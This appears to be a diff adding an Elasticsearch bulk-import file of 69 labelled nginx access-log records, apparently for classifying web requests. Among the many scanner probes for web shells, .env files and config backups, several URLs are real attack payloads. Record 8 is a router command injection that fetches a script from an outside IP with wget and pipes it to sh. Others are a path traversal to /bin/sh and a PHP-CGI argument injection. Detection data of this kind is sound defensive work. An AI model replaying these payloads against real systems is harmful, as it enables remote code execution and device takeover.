@@ -1,0 +1,138 @@
+{ "index": {"_id": "1", "_index": "enrich-nginxv2" } } 
+{ "code": 1, "event.category": "web", "event.kind": "event", "event.outcome": "success", "event.type": "access", "http.request.method": "GET", "http.response.status_code": 200, "http.version": 1.1, "log.file.path": "/var/log/nginx/access.log", "url.original": "/"}
+{ "index": {"_id": "2", "_index": "enrich-nginxv2" } } 
+{ "code": 2, "event.category": "web", "event.kind": "event", "event.outcome": "success", "event.type": "access", "http.request.method": "GET", "http.response.status_code": 200, "http.version": 1.1, "log.file.path": "/var/log/nginx/access.log", "url.original": "/login"}
+{ "index": {"_id": "3", "_index": "enrich-nginxv2" } } 
+{ "code": 3, "event.category": "web", "event.kind": "event", "event.outcome": "success", "event.type": "access", "http.request.method": "GET", "http.response.status_code": 200, "http.version": 1.1, "log.file.path": "/var/log/nginx/access.log", "url.original": "/login/?_task=login&_err=session"}
+{ "index": {"_id": "4", "_index": "enrich-nginxv2" } } 
+{ "code": 4, "event.category": "web", "event.kind": "event", "event.outcome": "success", "event.type": "access", "http.request.method": "GET", "http.response.status_code": 200, "http.version": 1.1, "log.file.path": "/var/log/nginx/access.log", "url.original": "/login/?_task=login&_action=refresh"}
+{ "index": {"_id": "5", "_index": "enrich-nginxv2" } } 
+{ "code": 5, "event.category": "web", "event.kind": "event", "event.outcome": "success", "event.type": "access", "http.request.method": "GET", "http.response.status_code": 200, "http.version": 1.1, "log.file.path": "/var/log/nginx/access.log", "url.original": "/?XDEBUG_SESSION_START=phpstorm"}
+{ "index": {"_id": "6", "_index": "enrich-nginxv2" } } 
+{ "code": 6, "event.category": "web", "event.kind": "event", "event.outcome": "success", "event.type": "access", "http.request.method": "GET", "http.response.status_code": 301, "http.version": 1.1, "log.file.path": "/var/log/nginx/access.log", "url.original": "/"}
+{ "index": {"_id": "7", "_index": "enrich-nginxv2" } } 
+{ "code": 7, "event.category": "web", "event.kind": "event", "event.outcome": "success", "event.type": "access", "http.request.method": "GET", "http.response.status_code": 301, "http.version": 1.1, "log.file.path": "/var/log/nginx/access.log", "url.original": "/favicon.ico"}
+{ "index": {"_id": "8", "_index": "enrich-nginxv2" } } 
+{ "code": 8, "event.category": "web", "event.kind": "event", "event.outcome": "success", "event.type": "access", "http.request.method": "GET", "http.response.status_code": 301, "http.version": 1.1, "log.file.path": "/var/log/nginx/access.log", "url.original": "/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+-O-+http%3A%2F%2F154.216.18.237%3A88%2Ft%7Csh%3B%60)"}
+{ "index": {"_id": "9", "_index": "enrich-nginxv2" } } 
+{ "code": 9, "event.category": "web", "event.kind": "event", "event.outcome": "success", "event.type": "access", "http.request.method": "GET", "http.response.status_code": 301, "http.version": 1.1, "log.file.path": "/var/log/nginx/access.log", "url.original": "/edit.php"}
+{ "index": {"_id": "10", "_index": "enrich-nginxv2" } } 
+{ "code": 10, "event.category": "web", "event.kind": "event", "event.outcome": "success", "event.type": "access", "http.request.method": "GET", "http.response.status_code": 301, "http.version": 1.1, "log.file.path": "/var/log/nginx/access.log", "url.original": "/small.php"}
+{ "index": {"_id": "11", "_index": "enrich-nginxv2" } } 
+{ "code": 11, "event.category": "web", "event.kind": "event", "event.outcome": "success", "event.type": "access", "http.request.method": "GET", "http.response.status_code": 301, "http.version": 1.1, "log.file.path": "/var/log/nginx/access.log", "url.original": "/wp-admin/images/wp-login.php"}
+{ "index": {"_id": "12", "_index": "enrich-nginxv2" } } 
+{ "code": 12, "event.category": "web", "event.kind": "event", "event.outcome": "success", "event.type": "access", "http.request.method": "GET", "http.response.status_code": 301, "http.version": 1.1, "log.file.path": "/var/log/nginx/access.log", "url.original": "/wp-includes/sodium_compat/namespaced/Core/Curve25519/Ge/index.php"}
+{ "index": {"_id": "13", "_index": "enrich-nginxv2" } } 
+{ "code": 13, "event.category": "web", "event.kind": "event", "event.outcome": "success", "event.type": "access", "http.request.method": "GET", "http.response.status_code": 301, "http.version": 1.1, "log.file.path": "/var/log/nginx/access.log", "url.original": "/xl2023.php"}
+{ "index": {"_id": "14", "_index": "enrich-nginxv2" } } 
+{ "code": 14, "event.category": "web", "event.kind": "event", "event.outcome": "success", "event.type": "access", "http.request.method": "GET", "http.response.status_code": 301, "http.version": 1.1, "log.file.path": "/var/log/nginx/access.log", "url.original": "/.env"}
+{ "index": {"_id": "15", "_index": "enrich-nginxv2" } } 
+{ "code": 15, "event.category": "web", "event.kind": "event", "event.outcome": "success", "event.type": "access", "http.request.method": "GET", "http.response.status_code": 301, "http.version": 1.1, "log.file.path": "/var/log/nginx/access.log", "url.original": "/.well-known/pki-validation/class_api.php"}
+{ "index": {"_id": "16", "_index": "enrich-nginxv2" } } 
+{ "code": 16, "event.category": "web", "event.kind": "event", "event.outcome": "success", "event.type": "access", "http.request.method": "GET", "http.response.status_code": 301, "http.version": 1.1, "log.file.path": "/var/log/nginx/access.log", "url.original": "/.well-known/pki-validation/wp-login.php"}
+{ "index": {"_id": "17", "_index": "enrich-nginxv2" } } 
+{ "code": 17, "event.category": "web", "event.kind": "event", "event.outcome": "success", "event.type": "access", "http.request.method": "GET", "http.response.status_code": 301, "http.version": 1.1, "log.file.path": "/var/log/nginx/access.log", "url.original": "/.well-known/themes.php"}
+{ "index": {"_id": "18", "_index": "enrich-nginxv2" } } 
+{ "code": 18, "event.category": "web", "event.kind": "event", "event.outcome": "success", "event.type": "access", "http.request.method": "GET", "http.response.status_code": 301, "http.version": 1.1, "log.file.path": "/var/log/nginx/access.log", "url.original": "/admin.php"}
+{ "index": {"_id": "19", "_index": "enrich-nginxv2" } } 
+{ "code": 19, "event.category": "web", "event.kind": "event", "event.outcome": "success", "event.type": "access", "http.request.method": "GET", "http.response.status_code": 301, "http.version": 1.1, "log.file.path": "/var/log/nginx/access.log", "url.original": "/bs.php"}
+{ "index": {"_id": "20", "_index": "enrich-nginxv2" } }
+{ "code": 20, "event.category": "web", "event.kind": "event", "event.outcome": "success", "event.type": "access", "http.request.method": "GET", "http.response.status_code": 301, "http.version": 1.1, "log.file.path": "/var/log/nginx/access.log", "url.original": "/cgi-bin/upfile.php"}
+{ "index": {"_id": "21", "_index": "enrich-nginxv2" } } 
+{ "code": 21, "event.category": "web", "event.kind": "event", "event.outcome": "success", "event.type": "access", "http.request.method": "GET", "http.response.status_code": 301, "http.version": 1.1, "log.file.path": "/var/log/nginx/access.log", "url.original": "/css/xmrlpc.php"}
+{ "index": {"_id": "22", "_index": "enrich-nginxv2" } } 
+{ "code": 22, "event.category": "web", "event.kind": "event", "event.outcome": "success", "event.type": "access", "http.request.method": "GET", "http.response.status_code": 301, "http.version": 1.1, "log.file.path": "/var/log/nginx/access.log", "url.original": "/hose.php"}
+{ "index": {"_id": "23", "_index": "enrich-nginxv2" } } 
+{ "code": 23, "event.category": "web", "event.kind": "event", "event.outcome": "success", "event.type": "access", "http.request.method": "GET", "http.response.status_code": 301, "http.version": 1.1, "log.file.path": "/var/log/nginx/access.log", "url.original": "/ioxi1.php"}
+{ "index": {"_id": "24", "_index": "enrich-nginxv2" } } 
+{ "code": 24, "event.category": "web", "event.kind": "event", "event.outcome": "success", "event.type": "access", "http.request.method": "GET", "http.response.status_code": 301, "http.version": 1.1, "log.file.path": "/var/log/nginx/access.log", "url.original": "/j.php"}
+{ "index": {"_id": "25", "_index": "enrich-nginxv2" } } 
+{ "code": 25, "event.category": "web", "event.kind": "event", "event.outcome": "success", "event.type": "access", "http.request.method": "GET", "http.response.status_code": 301, "http.version": 1.1, "log.file.path": "/var/log/nginx/access.log", "url.original": "/manager/html"}
+{ "index": {"_id": "26", "_index": "enrich-nginxv2" } } 
+{ "code": 26, "event.category": "web", "event.kind": "event", "event.outcome": "success", "event.type": "access", "http.request.method": "GET", "http.response.status_code": 301, "http.version": 1.1, "log.file.path": "/var/log/nginx/access.log", "url.original": "/wp-admin/css/colors/blue/admin.php"}
+{ "index": {"_id": "27", "_index": "enrich-nginxv2" } } 
+{ "code": 27, "event.category": "web", "event.kind": "event", "event.outcome": "success", "event.type": "access", "http.request.method": "GET", "http.response.status_code": 301, "http.version": 1.1, "log.file.path": "/var/log/nginx/access.log", "url.original": "/wp-admin/css/colors/blue/atomlib.php"}
+{ "index": {"_id": "28", "_index": "enrich-nginxv2" } } 
+{ "code": 28, "event.category": "web", "event.kind": "event", "event.outcome": "success", "event.type": "access", "http.request.method": "GET", "http.response.status_code": 301, "http.version": 1.1, "log.file.path": "/var/log/nginx/access.log", "url.original": "/wp-content/plugins/content-management/content.php"}
+{ "index": {"_id": "29", "_index": "enrich-nginxv2" } } 
+{ "code": 29, "event.category": "web", "event.kind": "event", "event.outcome": "success", "event.type": "access", "http.request.method": "GET", "http.response.status_code": 301, "http.version": 1.1, "log.file.path": "/var/log/nginx/access.log", "url.original": "/wp-content/plugins/moon.php"}
+{ "index": {"_id": "30", "_index": "enrich-nginxv2" } } 
+{ "code": 30, "event.category": "web", "event.kind": "event", "event.outcome": "success", "event.type": "access", "http.request.method": "GET", "http.response.status_code": 301, "http.version": 1.1, "log.file.path": "/var/log/nginx/access.log", "url.original": "/wp-content/plugins/revslider/includes/external/page/index.php"}
+{ "index": {"_id": "31", "_index": "enrich-nginxv2" } } 
+{ "code": 31, "event.category": "web", "event.kind": "event", "event.outcome": "success", "event.type": "access", "http.request.method": "GET", "http.response.status_code": 301, "http.version": 1.1, "log.file.path": "/var/log/nginx/access.log", "url.original": "/wp-content/plugins/seoplugins/mar.php"}
+{ "index": {"_id": "32", "_index": "enrich-nginxv2" } } 
+{ "code": 32, "event.category": "web", "event.kind": "event", "event.outcome": "success", "event.type": "access", "http.request.method": "GET", "http.response.status_code": 200, "http.version": 1.1, "log.file.path": "/var/log/nginx/access.log", "url.original": "/login/program/js/app.min.js?s=1699174738"}
+{ "index": {"_id": "33", "_index": "enrich-nginxv2" } } 
+{ "code": 33, "event.category": "web", "event.kind": "event", "event.outcome": "success", "event.type": "access", "http.request.method": "GET", "http.response.status_code": 200, "http.version": 1.1, "log.file.path": "/var/log/nginx/access.log", "url.original": "/login/program/js/common.min.js?s=1699174738"}
+{ "index": {"_id": "34", "_index": "enrich-nginxv2" } } 
+{ "code": 34, "event.category": "web", "event.kind": "event", "event.outcome": "success", "event.type": "access", "http.request.method": "GET", "http.response.status_code": 200, "http.version": 1.1, "log.file.path": "/var/log/nginx/access.log", "url.original": "/login/program/js/jstz.min.js?s=1699174742"}
+{ "index": {"_id": "35", "_index": "enrich-nginxv2" } } 
+{ "code": 35, "event.category": "web", "event.kind": "event", "event.outcome": "success", "event.type": "access", "http.request.method": "GET", "http.response.status_code": 200, "http.version": 1.1, "log.file.path": "/var/log/nginx/access.log", "url.original": "/login/program/js/jquery.min.js?s=1699174741"}
+{ "index": {"_id": "36", "_index": "enrich-nginxv2" } } 
+{ "code": 36, "event.category": "web", "event.kind": "event", "event.outcome": "failure", "event.type": "access", "http.request.method": "POST", "http.response.status_code": 404, "http.version": 1.1, "log.file.path": "/var/log/nginx/access.log", "url.original": "/dns-query"}
+{ "index": {"_id": "37", "_index": "enrich-nginxv2" } } 
+{ "code": 37, "event.category": "web", "event.kind": "event", "event.outcome": "failure", "event.type": "access", "http.request.method": "POST", "http.response.status_code": 405, "http.version": 1.1, "log.file.path": "/var/log/nginx/access.log", "url.original": "/"}
+{ "index": {"_id": "38", "_index": "enrich-nginxv2" } } 
+{ "code": 38, "event.category": "web", "event.kind": "event", "event.outcome": "failure", "event.type": "access", "http.request.method": "POST", "http.response.status_code": 400, "http.version": 1.1, "log.file.path": "/var/log/nginx/access.log", "url.original": "-"}
+{ "index": {"_id": "39", "_index": "enrich-nginxv2" } } 
+{ "code": 39, "event.category": "web", "event.kind": "event", "event.outcome": "failure", "event.type": "access", "http.request.method": "POST", "http.response.status_code": 400, "http.version": 1.1, "log.file.path": "/var/log/nginx/access.log", "url.original": "/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh"}
+{ "index": {"_id": "40", "_index": "enrich-nginxv2" } } 
+{ "code": 40, "event.category": "web", "event.kind": "event", "event.outcome": "failure", "event.type": "access", "http.request.method": "POST", "http.response.status_code": 404, "http.version": 1.1, "log.file.path": "/var/log/nginx/access.log", "url.original": "/hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input"}
+{ "index": {"_id": "41", "_index": "enrich-nginxv2" } } 
+{ "code": 41, "event.category": "web", "event.kind": "event", "event.outcome": "failure", "event.type": "access", "http.request.method": "OPTIONS", "http.response.status_code": 405, "http.version": 1.1, "log.file.path": "/var/log/nginx/access.log", "url.original": "/"}
+{ "index": {"_id": "42", "_index": "enrich-nginxv2" } } 
+{ "code": 42, "event.category": "web", "event.kind": "event", "event.outcome": "failure", "event.type": "access", "http.request.method": "HEAD", "http.response.status_code": 404, "http.version": 1.1, "log.file.path": "/var/log/nginx/access.log", "url.original": "/owa/"}
+{ "index": {"_id": "43", "_index": "enrich-nginxv2" } } 
+{ "code": 43, "event.category": "web", "event.kind": "event", "event.outcome": "failure", "event.type": "access", "http.request.method": "HEAD", "http.response.status_code": 404, "http.version": 1.1, "log.file.path": "/var/log/nginx/access.log", "url.original": "/backup"}
+{ "index": {"_id": "44", "_index": "enrich-nginxv2" } } 
+{ "code": 44, "event.category": "web", "event.kind": "event", "event.outcome": "failure", "event.type": "access", "http.request.method": "HEAD", "http.response.status_code": 404, "http.version": 1.1, "log.file.path": "/var/log/nginx/access.log", "url.original": "/bc"}
+{ "index": {"_id": "45", "_index": "enrich-nginxv2" } } 
+{ "code": 45, "event.category": "web", "event.kind": "event", "event.outcome": "failure", "event.type": "access", "http.request.method": "HEAD", "http.response.status_code": 404, "http.version": 1.1, "log.file.path": "/var/log/nginx/access.log", "url.original": "/bk"}
+{ "index": {"_id": "46", "_index": "enrich-nginxv2" } } 
+{ "code": 46, "event.category": "web", "event.kind": "event", "event.outcome": "failure", "event.type": "access", "http.request.method": "HEAD", "http.response.status_code": 404, "http.version": 1.1, "log.file.path": "/var/log/nginx/access.log", "url.original": "/home"}
+{ "index": {"_id": "47", "_index": "enrich-nginxv2" } } 
+{ "code": 47, "event.category": "web", "event.kind": "event", "event.outcome": "failure", "event.type": "access", "http.request.method": "HEAD", "http.response.status_code": 404, "http.version": 1.1, "log.file.path": "/var/log/nginx/access.log", "url.original": "/main"}
+{ "index": {"_id": "48", "_index": "enrich-nginxv2" } } 
+{ "code": 48, "event.category": "web", "event.kind": "event", "event.outcome": "failure", "event.type": "access", "http.request.method": "HEAD", "http.response.status_code": 404, "http.version": 1.1, "log.file.path": "/var/log/nginx/access.log", "url.original": "/new"}
+{ "index": {"_id": "49", "_index": "enrich-nginxv2" } } 
+{ "code": 49, "event.category": "web", "event.kind": "event", "event.outcome": "failure", "event.type": "access", "http.request.method": "HEAD", "http.response.status_code": 404, "http.version": 1.1, "log.file.path": "/var/log/nginx/access.log", "url.original": "/old"}
+{ "index": {"_id": "50", "_index": "enrich-nginxv2" } } 
+{ "code": 50, "event.category": "web", "event.kind": "event", "event.outcome": "failure", "event.type": "access", "http.request.method": "HEAD", "http.response.status_code": 404, "http.version": 1.1, "log.file.path": "/var/log/nginx/access.log", "url.original": "/wordpress"}
+{ "index": {"_id": "51", "_index": "enrich-nginxv2" } } 
+{ "code": 51, "event.category": "web", "event.kind": "event", "event.outcome": "failure", "event.type": "access", "http.request.method": "HEAD", "http.response.status_code": 404, "http.version": 1.1, "log.file.path": "/var/log/nginx/access.log", "url.original": "/wp"}
+{ "index": {"_id": "52", "_index": "enrich-nginxv2" } } 
+{ "code": 52, "event.category": "web", "event.kind": "event", "event.outcome": "failure", "event.type": "access", "http.request.method": "HEAD", "http.response.status_code": 404, "http.version": 1.1, "log.file.path": "/var/log/nginx/access.log", "url.original": "/epa/scripts/win/nsepa_setup.exe"}
+{ "index": {"_id": "53", "_index": "enrich-nginxv2" } } 
+{ "code": 53, "event.category": "web", "event.kind": "event", "event.outcome": "failure", "event.type": "access", "http.request.method": "HEAD", "http.response.status_code": 404, "http.version": 1.1, "log.file.path": "/var/log/nginx/access.log", "url.original": "/"}
+{ "index": {"_id": "54", "_index": "enrich-nginxv2" } } 
+{ "code": 54, "event.category": "web", "event.kind": "event", "event.outcome": "failure", "event.type": "access", "http.request.method": "HEAD", "http.response.status_code": 404, "http.version": 1.1, "log.file.path": "/var/log/nginx/access.log", "url.original": "/config/config.inc.php-alt"}
+{ "index": {"_id": "55", "_index": "enrich-nginxv2" } } 
+{ "code": 55, "event.category": "web", "event.kind": "event", "event.outcome": "failure", "event.type": "access", "http.request.method": "HEAD", "http.response.status_code": 404, "http.version": 1.1, "log.file.path": "/var/log/nginx/access.log", "url.original": "/config/config.inc.php-backup"}
+{ "index": {"_id": "56", "_index": "enrich-nginxv2" } } 
+{ "code": 56, "event.category": "web", "event.kind": "event", "event.outcome": "failure", "event.type": "access", "http.request.method": "HEAD", "http.response.status_code": 404, "http.version": 1.1, "log.file.path": "/var/log/nginx/access.log", "url.original": "/config/config.inc.php-old"}
+{ "index": {"_id": "57", "_index": "enrich-nginxv2" } } 
+{ "code": 57, "event.category": "web", "event.kind": "event", "event.outcome": "failure", "event.type": "access", "http.request.method": "HEAD", "http.response.status_code": 404, "http.version": 1.1, "log.file.path": "/var/log/nginx/access.log", "url.original": "/config/config.inc.php.BAK"}
+{ "index": {"_id": "58", "_index": "enrich-nginxv2" } } 
+{ "code": 58, "event.category": "web", "event.kind": "event", "event.outcome": "failure", "event.type": "access", "http.request.method": "HEAD", "http.response.status_code": 404, "http.version": 1.1, "log.file.path": "/var/log/nginx/access.log", "url.original": "/config/config.inc.php.OLD"}
+{ "index": {"_id": "59", "_index": "enrich-nginxv2" } } 
+{ "code": 59, "event.category": "web", "event.kind": "event", "event.outcome": "failure", "event.type": "access", "http.request.method": "HEAD", "http.response.status_code": 404, "http.version": 1.1, "log.file.path": "/var/log/nginx/access.log", "url.original": "/config/config.inc.php.alt"}
+{ "index": {"_id": "60", "_index": "enrich-nginxv2" } } 
+{ "code": 60, "event.category": "web", "event.kind": "event", "event.outcome": "failure", "event.type": "access", "http.request.method": "HEAD", "http.response.status_code": 404, "http.version": 1.1, "log.file.path": "/var/log/nginx/access.log", "url.original": "/config/config.inc.php.backup"}
+{ "index": {"_id": "61", "_index": "enrich-nginxv2" } } 
+{ "code": 61, "event.category": "web", "event.kind": "event", "event.outcome": "failure", "event.type": "access", "http.request.method": "HEAD", "http.response.status_code": 404, "http.version": 1.1, "log.file.path": "/var/log/nginx/access.log", "url.original": "/config/config.inc.php.bak"}
+{ "index": {"_id": "62", "_index": "enrich-nginxv2" } } 
+{ "code": 62, "event.category": "web", "event.kind": "event", "event.outcome": "failure", "event.type": "access", "http.request.method": "HEAD", "http.response.status_code": 404, "http.version": 1.1, "log.file.path": "/var/log/nginx/access.log", "url.original": "/logs/errors"}
+{ "index": {"_id": "63", "_index": "enrich-nginxv2" } } 
+{ "code": 63, "event.category": "web", "event.kind": "event", "event.outcome": "failure", "event.type": "access", "http.request.method": "HEAD", "http.response.status_code": 404, "http.version": 1.1, "log.file.path": "/var/log/nginx/access.log", "url.original": "/logs/errors.gz"}
+{ "index": {"_id": "64", "_index": "enrich-nginxv2" } } 
+{ "code": 64, "event.category": "web", "event.kind": "event", "event.outcome": "failure", "event.type": "access", "http.request.method": "HEAD", "http.response.status_code": 404, "http.version": 1.1, "log.file.path": "/var/log/nginx/access.log", "url.original": "/logs/errors.log"}
+{ "index": {"_id": "65", "_index": "enrich-nginxv2" } } 
+{ "code": 65, "event.category": "web", "event.kind": "event", "event.outcome": "failure", "event.type": "access", "http.request.method": "HEAD", "http.response.status_code": 404, "http.version": 1.1, "log.file.path": "/var/log/nginx/access.log", "url.original": "/logs/errors.log.1"}
+{ "index": {"_id": "66", "_index": "enrich-nginxv2" } } 
+{ "code": 66, "event.category": "web", "event.kind": "event", "event.outcome": "failure", "event.type": "access", "http.request.method": "HEAD", "http.response.status_code": 404, "http.version": 1.1, "log.file.path": "/var/log/nginx/access.log", "url.original": "/logs/errors.log.1.gz"}
+{ "index": {"_id": "67", "_index": "enrich-nginxv2" } } 
+{ "code": 67, "event.category": "web", "event.kind": "event", "event.outcome": "failure", "event.type": "access", "http.request.method": "HEAD", "http.response.status_code": 404, "http.version": 1.1, "log.file.path": "/var/log/nginx/access.log", "url.original": "/logs/errors.log.gz"}
+{ "index": {"_id": "68", "_index": "enrich-nginxv2" } } 
+{ "code": 68, "event.category": "web", "event.kind": "event", "event.outcome": "failure", "event.type": "access", "http.request.method": "HEAD", "http.response.status_code": 404, "http.version": 1.1, "log.file.path": "/var/log/nginx/access.log", "url.original": "/logs/errors.log1"}
+{ "index": {"_id": "69", "_index": "enrich-nginxv2" } } 
+{ "code": 69, "event.category": "web", "event.kind": "event", "event.outcome": "failure", "event.type": "access", "http.request.method": "GET", "http.response.status_code": 408, "http.version": 1.1, "log.file.path": "/var/log/nginx/access.log", "url.original": "/?REPLACE-ME-WITH-INTEGER-FOR-SLOWLORIS-DDOS"}
